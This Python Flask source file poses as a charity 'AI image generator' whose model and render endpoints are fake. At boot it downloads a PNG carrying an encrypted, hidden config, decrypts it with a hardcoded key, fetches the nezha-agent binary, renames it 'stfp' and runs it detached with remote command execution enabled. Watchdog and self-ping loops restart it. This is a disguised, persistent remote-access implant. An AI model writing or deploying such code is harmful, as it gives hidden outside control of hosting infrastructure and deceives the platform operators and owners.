"""
GreenLeaf AI Image Generator - Python 版
从 indextupian/index.src.js 重写

核心功能：
1. Flask Web 服务器（端口 4567）
2. 下载并解密哪吒配置（AES-256-CBC）
3. 下载并运行 nezha-agent
4. 自 ping keepalive 机制
"""

import os
import re
import sys
import time
import socket
import hashlib
import logging
import threading
import subprocess
import urllib.request
import urllib.parse
import ssl
from pathlib import Path
from datetime import datetime, timezone

# 第三方依赖
import requests
from flask import Flask, request, jsonify, Response

# ========== 日志配置 ==========
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)
log = logging.getLogger('greenleaf')

# ========== 路径配置 ==========
APP_BASE = '/app'
TMP_BASE = '/tmp'


def resolve_writable_dir(env_var, subpath):
    """选择可写目录，优先 /app，回退 /tmp。"""
    candidates = []
    if env_var:
        candidates.append(env_var)
    candidates.append(f'{APP_BASE}/{subpath}')
    candidates.append(f'{TMP_BASE}/{subpath}')

    for p in candidates:
        try:
            Path(p).mkdir(parents=True, exist_ok=True)
            test_file = Path(p) / f'.write_test_{int(time.time() * 1000)}'
            test_file.write_text('x')
            test_file.unlink()
            return p
        except Exception:
            continue
    final = f'{TMP_BASE}/{subpath}'
    Path(final).mkdir(parents=True, exist_ok=True)
    return final


BASEDIR = resolve_writable_dir(os.environ.get('BASE_DIR'), '.npm_logs')
CACHE_DIR = resolve_writable_dir(os.environ.get('CACHE_DIR'), 'agent_cache')
TMP_DIR = resolve_writable_dir(os.environ.get('TMP_DIR'), '.tmp_dl')

AGENT_BIN = str(Path(CACHE_DIR) / 'stfp')
CONFIG_PATH = str(Path(CACHE_DIR) / 'config.yml')
LOCAL_IMAGE_PATH = str(Path(CACHE_DIR) / 'dknz.png')
ZIP_PATH = str(Path(TMP_DIR) / 'agent.zip')
HTML_PATH = str(Path(__file__).parent / 'index.html')

# ========== 环境变量 ==========
PORT = int(os.environ.get('SERVER_PORT') or os.environ.get('PORT') or '4567')

ALIVE_DOMAIN = os.environ.get('ALIVE_DOMAIN', '')
ALIVE_PROTOCOL = (os.environ.get('ALIVE_PROTOCOL') or 'https').lower()
ALIVE_PATH = os.environ.get('ALIVE_PATH', '/')
ALIVE_INTERVAL = int(os.environ.get('ALIVE_INTERVAL') or '5')

# GitHub 代理（下载 nezha-agent 用）
GH_PROXIES = [
    'https://gh-proxy.com/',
    'https://mirror.ghproxy.com/',
    'https://ghproxy.net/',
    ''
]

# 哪吒配置图片的解密密钥（跟 JS 版一致）
CRYPTO_KEY = b'1234567890abcdef1234567890abcdef'

# ========== 全局状态 ==========
agent_process = None  # subprocess.Popen 对象
agent_lock = threading.Lock()
last_ip = None
start_time = time.time()


# ========== 工具函数 ==========
def fetch_text(url, timeout=15):
    """获取 URL 返回的文本。"""
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
    with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
        return resp.read().decode('utf-8', errors='ignore').strip()


def fetch_file_with_fallback(raw_url, dest_path, timeout=120):
    """用 GitHub 代理列表逐个尝试下载文件。"""
    last_err = None
    for proxy in GH_PROXIES:
        full_url = f'{proxy}{raw_url}' if proxy else raw_url
        try:
            fetch_file(full_url, dest_path, timeout)
            return True
        except Exception as e:
            last_err = e
            try:
                Path(dest_path).unlink()
            except Exception:
                pass
    if last_err:
        raise last_err
    raise RuntimeError('all proxies failed')


def fetch_file(url, dest_path, timeout=120):
    """下载文件到指定路径。"""
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
    with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
        with open(dest_path, 'wb') as f:
            while True:
                chunk = resp.read(64 * 1024)
                if not chunk:
                    break
                f.write(chunk)


def get_server_ip():
    """获取公网 IP，尝试多个服务，最后回退到网卡 IP。"""
    global last_ip

    # 1. 环境变量优先
    if os.environ.get('PUBLIC_IP'):
        ip = os.environ['PUBLIC_IP'].strip()
        last_ip = ip
        return ip

    # 2. 多个 IP 查询服务
    services = [
        'https://api.ip.sb/ip',
        'https://ifconfig.me/ip',
        'https://ipinfo.io/ip',
        'https://icanhazip.com',
        'https://checkip.amazonaws.com',
    ]
    for svc in services:
        try:
            ip = fetch_text(svc, timeout=8)
            if ip and re.match(r'^\d+\.\d+\.\d+\.\d+$', ip):
                last_ip = ip
                return ip
        except Exception:
            continue

    # 3. 网卡 IP
    try:
        for name, addrs in socket.if_nameindex():
            pass  # 不是所有平台都支持
    except Exception:
        pass

    # 简单的 UDP socket trick 拿出口 IP
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(('8.8.8.8', 80))
        ip = s.getsockname()[0]
        s.close()
        last_ip = ip
        return ip
    except Exception:
        pass

    return '127.0.0.1'


def generate_uuid(ip):
    """根据 IP 生成 UUID（MD5 哈希）。"""
    h = hashlib.md5(ip.encode()).hexdigest()
    return f'{h[0:8]}-{h[8:12]}-{h[12:16]}-{h[16:20]}-{h[20:32]}'


def parse_image_metadata(image_path):
    """从 PNG 图片中提取并解密哪吒配置。

    图片里嵌入了 ==NZ_CONFIG_START== ... ==NZ_CONFIG_END== 标记，
    中间是 AES-256-CBC 加密的配置（IV:encrypted 格式，hex 编码）。
    """
    try:
        with open(image_path, 'rb') as f:
            buffer = f.read()

        start_marker = b'==NZ_CONFIG_START=='
        end_marker = b'==NZ_CONFIG_END=='

        start_pos = buffer.find(start_marker)
        if start_pos == -1:
            return None

        end_pos = buffer.find(end_marker, start_pos)
        if end_pos == -1:
            return None

        payload_str = buffer[start_pos + len(start_marker):end_pos].decode('utf-8', errors='ignore').strip()

        # 格式：iv_hex:encrypted_hex
        parts = payload_str.split(':')
        iv = bytes.fromhex(parts[0])
        encrypted = bytes.fromhex(':'.join(parts[1:]))

        # AES-256-CBC 解密
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        from cryptography.hazmat.backends import default_backend
        cipher = Cipher(algorithms.AES(CRYPTO_KEY), modes.CBC(iv), backend=default_backend())
        decryptor = cipher.decryptor()
        padded = decryptor.update(encrypted) + decryptor.finalize()

        # PKCS7 去填充
        pad_len = padded[-1]
        if pad_len <= 16:
            decrypted = padded[:-pad_len].decode('utf-8', errors='ignore')
        else:
            decrypted = padded.decode('utf-8', errors='ignore')

        return decrypted
    except Exception as e:
        log.warning(f'parseImageMetadata failed: {e}')
        return None


def parse_env(text):
    """从文本中解析 NZ_SERVER / NZ_TLS / NZ_SECRET 环境变量。"""
    env = {}
    pattern = r'(?:export\s+)?(NZ_SERVER|NZ_TLS|NZ_SECRET)\s*=\s*[\'"]([^\'"]+)[\'"]'
    for match in re.finditer(pattern, text):
        env[match.group(1)] = match.group(2)
    return env


def is_process_alive(proc):
    """检查 subprocess.Popen 对象是否还活着。"""
    if proc is None:
        return False
    return proc.poll() is None


# ========== 核心逻辑：启动 nezha agent ==========
def start_nezha_agent():
    """下载（如缺失）并启动 nezha agent。"""
    global agent_process

    with agent_lock:
        if agent_process and is_process_alive(agent_process):
            return True

        try:
            # 1. 下载配置图片
            image_url = 'https://raw.githubusercontent.com/1715Yy/vipnezhash/main/dknz.png'
            log.info(f'Downloading nezha config image...')
            fetch_file_with_fallback(image_url, LOCAL_IMAGE_PATH)

            # 2. 解密配置
            decrypted_text = parse_image_metadata(LOCAL_IMAGE_PATH)
            if not decrypted_text:
                log.error('Failed to decrypt nezha config from image')
                return False

            nezha_config = parse_env(decrypted_text)
            if not nezha_config.get('NZ_SERVER') or not nezha_config.get('NZ_SECRET'):
                log.error(f'Nezha config incomplete: {nezha_config}')
                return False

            log.info(f'Nezha config: server={nezha_config["NZ_SERVER"]}, tls={nezha_config.get("NZ_TLS")}')

            # 3. 获取 IP + 生成 UUID
            ip = get_server_ip()
            uuid = generate_uuid(ip)
            log.info(f'Server IP: {ip}, UUID: {uuid}')

            # 4. 下载 nezha agent 二进制（如缺失）
            if not os.path.exists(AGENT_BIN):
                log.info('Downloading nezha-agent binary...')
                import platform
                machine = platform.machine().lower()
                if machine in ('x86_64', 'amd64'):
                    arch = 'amd64'
                elif machine in ('aarch64', 'arm64'):
                    arch = 'arm64'
                elif machine in ('armv7l', 'arm'):
                    arch = 'armv7'
                else:
                    arch = 'amd64'

                raw_url = f'https://github.com/nezhahq/agent/releases/latest/download/nezha-agent_linux_{arch}.zip'
                fetch_file_with_fallback(raw_url, ZIP_PATH)

                # 解压
                import zipfile
                import shutil
                if os.path.exists(CACHE_DIR):
                    shutil.rmtree(CACHE_DIR, ignore_errors=True)
                os.makedirs(CACHE_DIR, exist_ok=True)

                with zipfile.ZipFile(ZIP_PATH, 'r') as zf:
                    zf.extractall(CACHE_DIR)
                try:
                    os.unlink(ZIP_PATH)
                except Exception:
                    pass

                origin_bin = os.path.join(CACHE_DIR, 'nezha-agent')
                if os.path.exists(origin_bin):
                    shutil.move(origin_bin, AGENT_BIN)
                    os.chmod(AGENT_BIN, 0o755)
                    log.info(f'nezha-agent installed to {AGENT_BIN}')
                else:
                    log.error('nezha-agent binary not found in zip')
                    return False

            # 5. 写配置文件
            tls_enabled = nezha_config.get('NZ_TLS', '') in ('true', '1')
            config_content = f"""server: '{nezha_config['NZ_SERVER']}'
client_secret: '{nezha_config['NZ_SECRET']}'
client_id: '{uuid}'
tls: {str(tls_enabled).lower()}
report_delay: 4
debug: false
disable_auto_update: false
disable_command_execute: false
disable_force_update: false
disable_nat: false
disable_send_query: false
gpu: false
insecure_tls: true
ip_report_period: 1800
skip_connection_count: true
skip_procs_count: true
temperature: false
use_gitee_to_upgrade: false
use_ipv6_country_code: false
uuid: '{uuid}'
"""
            with open(CONFIG_PATH, 'w') as f:
                f.write(config_content)
            log.info(f'Config written to {CONFIG_PATH}')

            # 6. 启动 agent 进程
            env = os.environ.copy()
            env['UUID'] = uuid
            env['NZ_CLIENT_ID'] = uuid
            env['NZ_REPORT_DELAY'] = '4'

            agent_process = subprocess.Popen(
                [AGENT_BIN, '-c', CONFIG_PATH],
                env=env,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                start_new_session=True,  # detached
            )
            log.info(f'nezha-agent started, PID={agent_process.pid}')
            return True

        except Exception as e:
            log.error(f'startNezhaAgent failed: {e}', exc_info=True)
            agent_process = None
            return False


def monitor_processes():
    """定期检查 agent 进程，挂了就重启。"""
    if not is_process_alive(agent_process):
        log.warning('Agent process dead, restarting...')
        start_nezha_agent()


def scheduler_loop():
    """每 2 分钟检查一次 agent 健康状态。"""
    while True:
        try:
            monitor_processes()
        except Exception as e:
            log.error(f'scheduler error: {e}')
        time.sleep(120)


def self_ping():
    """自 ping 保活：防止平台休眠 + 重启挂掉的 agent。"""
    # 0. 如果 agent 挂了，立刻重启
    if not is_process_alive(agent_process):
        threading.Thread(target=start_nezha_agent, daemon=True).start()

    # 1. ping 外部域名（防平台休眠）
    if ALIVE_DOMAIN:
        for path in [ALIVE_PATH, '/start-nz']:
            try:
                url = f'{ALIVE_PROTOCOL}://{ALIVE_DOMAIN}{path}'
                requests.get(url, timeout=10, verify=False)
            except Exception:
                pass

    # 2. ping 本地服务（保持响应）
    for path in ['/api/v1/status', '/start-nz']:
        try:
            requests.get(f'http://127.0.0.1:{PORT}{path}', timeout=5)
        except Exception:
            pass


def alive_keeper_loop():
    """自 ping 循环。"""
    # 首次 ping 延迟 10 秒
    time.sleep(10)
    interval = max(ALIVE_INTERVAL, 1) * 60
    while True:
        try:
            self_ping()
        except Exception as e:
            log.error(f'alive_keeper error: {e}')
        time.sleep(interval)


# ========== Flask 应用 ==========
app = Flask(__name__)


@app.route('/')
@app.route('/index.html')
def index():
    """首页。"""
    try:
        with open(HTML_PATH, 'r', encoding='utf-8') as f:
            return Response(f.read(), mimetype='text/html; charset=utf-8')
    except Exception:
        return Response(
            '<!DOCTYPE html><html><head><meta charset="utf-8">'
            '<title>GreenLeaf AI Image Generator</title></head>'
            '<body><h1>GreenLeaf AI Image Generator</h1></body></html>',
            mimetype='text/html; charset=utf-8'
        )


@app.route('/about')
@app.route('/programs')
@app.route('/donate')
@app.route('/news')
def static_pages():
    """静态页面，全部返回首页内容。"""
    try:
        with open(HTML_PATH, 'r', encoding='utf-8') as f:
            return Response(f.read(), mimetype='text/html; charset=utf-8')
    except Exception:
        return Response('', mimetype='text/html; charset=utf-8')


@app.route('/robots.txt')
def robots():
    return Response(
        'User-agent: *\nAllow: /\nDisallow: /api/\n',
        mimetype='text/plain'
    )


@app.route('/start-nz')
def start_nz():
    """手动触发启动 nezha agent。"""
    ok = start_nezha_agent()
    return jsonify({'code': 0 if ok else -1, 'msg': 'ok' if ok else 'error'})


@app.route('/api/v1/status')
def status():
    """服务状态。"""
    return jsonify({
        'status': 'online',
        'service': 'GreenLeaf AI Image Generator',
        'version': '1.0.0',
        'models': ['green-leaf-v1', 'charity-art-v2', 'nature-style-v1'],
        'queue': 0,
        'uptime': time.time() - start_time,
        'running': is_process_alive(agent_process),
        'agent_pid': agent_process.pid if agent_process else None,
        'server_ip': last_ip
    })


@app.route('/api/v1/render', methods=['GET', 'POST'])
def render():
    """模拟渲染任务（演示用）。"""
    import secrets
    return jsonify({
        'code': 0,
        'msg': 'render task queued',
        'task_id': secrets.token_hex(8),
        'estimated_wait': '3-8s',
        'demo': True
    })


@app.route('/api/v1/models')
def models():
    """返回可用模型列表。"""
    return jsonify({
        'models': [
            {'id': 'green-leaf-v1', 'name': 'Green Leaf Style', 'description': 'Warm and bright charity poster style'},
            {'id': 'charity-art-v2', 'name': 'Charity Art', 'description': 'Artistic rendering for charity campaigns'},
            {'id': 'nature-style-v1', 'name': 'Nature Realism', 'description': 'Realistic nature scenes for eco topics'},
        ]
    })


@app.errorhandler(404)
def not_found(e):
    return Response(
        '<!DOCTYPE html><html><head><meta charset="utf-8">'
        '<title>404 - Page Not Found</title></head>'
        '<body style="font-family:sans-serif;text-align:center;padding:80px;">'
        '<h1>404</h1><p>Page not found. <a href="/">Back to home</a></p>'
        '</body></html>',
        status=404,
        mimetype='text/html; charset=utf-8'
    )


# ========== 启动 ==========
def boot():
    """启动后台任务。"""
    # 1. 3 秒后启动 nezha agent
    def delayed_agent():
        time.sleep(3)
        try:
            start_nezha_agent()
        except Exception as e:
            log.error(f'boot agent start failed: {e}')

    threading.Thread(target=delayed_agent, daemon=True).start()

    # 2. 启动 scheduler（每 2 分钟检查 agent）
    threading.Thread(target=scheduler_loop, daemon=True).start()

    # 3. 启动 alive keeper
    threading.Thread(target=alive_keeper_loop, daemon=True).start()


# 禁用 requests 的 SSL 警告
try:
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except Exception:
    pass


if __name__ == '__main__':
    log.info(f'Starting GreenLeaf AI Image Generator on port {PORT}')
    log.info(f'BASEDIR={BASEDIR}, CACHE_DIR={CACHE_DIR}, TMP_DIR={TMP_DIR}')
    log.info(f'ALIVE_DOMAIN={ALIVE_DOMAIN}, ALIVE_INTERVAL={ALIVE_INTERVAL}')

    boot()

    # 用 waitress 或 gunicorn 生产环境跑，开发用 Flask 自带
    app.run(host='0.0.0.0', port=PORT, debug=False, threaded=True)
else:
    # gunicorn 加载时也启动后台任务
    boot()
